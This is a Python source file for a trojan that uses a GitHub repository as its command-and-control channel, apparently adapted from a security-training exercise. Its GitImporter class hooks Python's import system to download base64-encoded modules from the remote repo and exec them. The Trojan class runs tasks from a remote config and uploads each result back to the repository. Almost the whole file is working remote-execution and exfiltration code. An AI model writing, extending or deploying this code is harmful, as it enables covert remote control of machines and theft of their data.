import base64
import github3
import importlib
import json
import random
import sys
import threading
import time

from datetime import datetime

import os
from dotenv import load_dotenv

################################################################
#
#
def github_connect():
    print("---github connect---")
    user = os.getenv("USER_NAME")
    key = os.getenv("GIT_TOKEN")
    sess = github3.login(token=key)
    repo = sess.repository(user,"ProjectX")
    return repo

def get_file_contents(dirname, module_name, repo):
    config_json = repo.file_contents(f'{dirname}/{module_name}').content
    return config_json

################################################################
#
#
class Trojan:
    def __init__(self, id):
        self.id = id
        self.config_file = f"{id}.json"
        self.data_path = f"testdata001/{id}/"
        self.repo = github_connect()

    def get_config(self):
        config_json = get_file_contents("cybersecurity/config",self.config_file,self.repo)
        config = json.loads(base64.b64decode(config_json))

        for task in config:
            print("-----")
            print(task)
            if task["module"] not in sys.modules:
                exec("import %s" % task["module"])
                print("--exec--")

        return config

    def module_runner(self, module):
        result = sys.modules[module].run()
        #print(result)
        self.store_module_result(result)

    def store_module_result(self, data):
        message = datetime.now().isoformat()
        remote_path = f"testdata001/{self.id}/{message}.data"
        print(remote_path)
        bindata = bytes("%r" % data, "utf-8")
        self.repo.create_file(remote_path, message, base64.b64encode(bindata))
        
    def run(self):
        print("-------run-------")
        config = self.get_config()
        for task in config:
            self.module_runner(task["module"])
            
################################################################
#
#
class GitImporter:
    def __init__(self):
        self.current_module_code = ""

    def find_module(self, name, path=None):
        print("[*] Attempting to retrieve %s" % name)
        self.repo = github_connect()

        print(self.repo)
        new_library = get_file_contents("cybersecurity", f'{name}.py', self.repo)
        if new_library is not None:
            self.current_module_code = base64.b64decode(new_library)
            return self

    def load_module(self, name):
        print("----load_module----")
        spec = importlib.util.spec_from_loader(name, loader=None, origin=self.repo.git_url)

        new_module = importlib.util.module_from_spec(spec)
        exec(self.current_module_code, new_module.__dict__)
        sys.modules[spec.name] = new_module
        
        return new_module
        

################################################################
#
#
if __name__ == "__main__":
    load_dotenv(".env")
    sys.meta_path.append(GitImporter())
    trojan = Trojan("abc")
    trojan.run()

    
